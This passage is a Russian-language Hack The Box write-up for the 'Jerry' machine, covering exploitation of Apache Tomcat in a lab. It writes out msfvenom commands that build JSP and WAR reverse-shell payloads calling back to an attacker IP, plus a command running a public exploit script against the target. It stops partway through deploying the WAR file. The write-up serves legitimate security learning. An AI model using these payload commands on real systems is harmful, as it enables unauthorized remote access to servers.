### Запуск Exploit

Сначала я думал, что нужно создать собственный shellcode в JSP, чтобы указать на коробку, и что exploit просто загружает файл. Однако оказалось, что программа фактически генерирует шелл. Параметр `pwn` похожего на имя файла.

Тем не менее, я быстро рассмотрел, что я сделал для создания `.jsp` шелл-пошивки:
- Сначала выполнил быстрый [[Writeups/Hack the Box/Boxes/Jerry/5 - Enumeration#Enumerating OS|OS Enumeration]] для проверки операционной системы, так как не был уверен на тот момент (мы можем обойтись без внимания к информации о коробке на HTB, но это не приятно)
- Создал пошивку с `msfvenom --f jsp -p windows/shell_reverse_tcp lhost=10.10.14.13 lport=9001 -o shell.jsp`
- Запустил [[netcat]] слушатель и попытался запустить exploit с `python2 42966.py -u http://10.10.10.95:8080 -p shell.jsp`

Теперь я знал, что это не нужно, изменил синтаксис, просто указав имя `shell`. Однако запуск с этими параметрами снова дал 404 `resource is not available` ошибку:

### Шелл из файла WAR

Следующий шаг – использовать это для загрузки шелла. Прокрутив ниже, нашел опцию для развертывания файла WAR:

![[Pasted image 20210504133840.png]]

Убедился быстро в `/usr/share/webshells`, чтобы увидеть, есть ли папка для файлов WAR, но её нет – поэтому использовал `msfvenom`:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/jerry]
└─$ msfvenom -p java/shell_reverse_tcp lhost=10.10.14.13 lport=9001 -f war -o warshell.war
Payload size: 13400 bytes
Final size of war file: 13400 bytes
Saved as: warshell.war
```

Найдя хороший гид по «kali war shell», я прошел через этот процесс: [https://www.ethicaltechsupport.com/blog-post/apache-tomcat-war-backdoor/](https://www.ethicaltechsupport.com/blog-post/apache-tomcat-war-backdoor/)

Затем выбрал файл на коробке и нажал deploy:
